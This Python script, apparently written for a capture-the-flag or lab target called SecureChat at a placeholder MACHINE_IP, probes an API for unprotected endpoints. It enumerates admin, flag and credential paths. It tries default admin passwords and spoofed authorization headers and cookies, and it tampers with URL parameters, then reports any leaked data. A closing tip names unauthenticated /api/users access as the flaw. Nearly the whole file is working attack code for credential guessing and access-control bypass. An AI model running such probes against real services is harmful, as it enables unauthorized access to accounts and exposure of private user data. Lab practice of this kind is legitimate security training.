#!/usr/bin/env python3
"""
Comprehensive API endpoint fuzzer for SecureChat
"""

import requests
import json

BASE_URL = "http://MACHINE_IP:5005"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Content-Type": "application/json"
}

print("=" * 80)
print("SecureChat API Fuzzer")
print("=" * 80)

# API endpoints to test
api_endpoints = [
    # User endpoints
    "/api/user/admin",
    "/api/user/user1",
    "/api/user/user2",
    "/api/users",
    "/api/user",
    "/api/profile",
    "/api/account",
    
    # Message endpoints
    "/api/messages",
    "/api/messages/admin",
    "/api/messages/user1",
    "/api/message",
    "/api/chat",
    "/api/chats",
    "/api/conversation",
    "/api/conversations",
    
    # Admin endpoints
    "/api/admin",
    "/api/admin/users",
    "/api/admin/messages",
    "/api/admin/config",
    "/api/admin/settings",
    "/api/admin/logs",
    "/api/admin/debug",
    "/api/admin/flag",
    
    # Auth endpoints
    "/api/login",
    "/api/auth",
    "/api/authenticate",
    "/api/token",
    "/api/session",
    "/api/logout",
    "/api/register",
    
    # Config endpoints
    "/api/config",
    "/api/settings",
    "/api/status",
    "/api/health",
    "/api/version",
    "/api/info",
    "/api/debug",
    
    # Flag/Secret endpoints
    "/api/flag",
    "/api/secret",
    "/api/key",
    "/api/token",
    "/api/credentials",
]

print("\n[*] Testing GET requests on API endpoints...")
print("-" * 80)

found_endpoints = []

for endpoint in api_endpoints:
    url = BASE_URL + endpoint
    
    try:
        response = requests.get(url, headers=headers, timeout=3)
        
        if response.status_code != 404:
            found_endpoints.append({
                "endpoint": endpoint,
                "method": "GET",
                "status": response.status_code,
                "response": response.text
            })
            
            print(f"\n[+] GET {endpoint}")
            print(f"    Status: {response.status_code}")
            print(f"    Length: {len(response.text)} bytes")
            
            if response.status_code == 200:
                print(f"    Response: {response.text[:300]}")
                
                # Check for sensitive keywords
                sensitive = ["flag", "password", "secret", "token", "key", "admin"]
                for keyword in sensitive:
                    if keyword in response.text.lower():
                        print(f"    ⚠️  Contains: {keyword}")
    
    except requests.exceptions.RequestException:
        pass

# Test POST requests on promising endpoints
print("\n" + "=" * 80)
print("[*] Testing POST requests on key endpoints...")
print("-" * 80)

post_endpoints = [
    ("/api/login", {"username": "admin", "password": "admin"}),
    ("/api/login", {"username": "admin", "password": "password"}),
    ("/api/login", {"username": "admin", "password": "admin123"}),
    ("/api/auth", {"username": "admin", "password": "admin"}),
    ("/api/messages", {"to": "admin", "message": "test"}),
    ("/api/user", {"username": "admin"}),
]

for endpoint, payload in post_endpoints:
    url = BASE_URL + endpoint
    
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=3)
        
        if response.status_code not in [404, 405]:
            print(f"\n[+] POST {endpoint}")
            print(f"    Payload: {payload}")
            print(f"    Status: {response.status_code}")
            print(f"    Response: {response.text[:300]}")
    
    except requests.exceptions.RequestException:
        pass

# Test with authentication headers
print("\n" + "=" * 80)
print("[*] Testing with authentication/admin headers...")
print("-" * 80)

auth_headers_sets = [
    {"Authorization": "Bearer admin"},
    {"Authorization": "Basic YWRtaW46YWRtaW4="},  # admin:admin
    {"X-Admin": "true"},
    {"X-Role": "admin"},
    {"X-User": "admin"},
    {"Cookie": "session=admin; role=admin"},
]

test_endpoints_auth = ["/api/admin", "/api/messages", "/api/flag", "/api/config"]

for auth_header in auth_headers_sets:
    test_headers = {**headers, **auth_header}
    
    for endpoint in test_endpoints_auth:
        url = BASE_URL + endpoint
        
        try:
            response = requests.get(url, headers=test_headers, timeout=3)
            
            if response.status_code == 200 and len(response.text) > 0:
                print(f"\n[+] {endpoint} with {list(auth_header.keys())[0]}")
                print(f"    Status: {response.status_code}")
                print(f"    Response: {response.text[:300]}")
        
        except:
            pass

# Test parameter fuzzing
print("\n" + "=" * 80)
print("[*] Testing URL parameters...")
print("-" * 80)

param_tests = [
    ("/api/messages", {"user": "admin"}),
    ("/api/messages", {"id": "1"}),
    ("/api/user", {"name": "admin"}),
    ("/api/user", {"id": "admin"}),
    ("/api/config", {"debug": "true"}),
    ("/api/flag", {"user": "admin"}),
]

for endpoint, params in param_tests:
    url = BASE_URL + endpoint
    
    try:
        response = requests.get(url, headers=headers, params=params, timeout=3)
        
        if response.status_code == 200:
            print(f"\n[+] {endpoint}?{requests.compat.urlencode(params)}")
            print(f"    Status: {response.status_code}")
            print(f"    Response: {response.text[:300]}")
    
    except:
        pass

# Summary
print("\n" + "=" * 80)
print("SUMMARY - ALL WORKING ENDPOINTS:")
print("=" * 80)

if found_endpoints:
    for item in found_endpoints:
        print(f"\n[{item['method']}] {item['endpoint']}")
        print(f"  Status: {item['status']}")
        print(f"  Response: {item['response'][:200]}")
else:
    print("\n[!] No additional endpoints found")

print("\n" + "=" * 80)
print("[*] Fuzzing Complete!")
print("=" * 80)
print("\n💡 TIP: The vulnerability is that /api/users is accessible without")
print("   authentication from ANY device (desktop/mobile), exposing all user data!")
print("   This violates the 'mobile-only' design assumption.")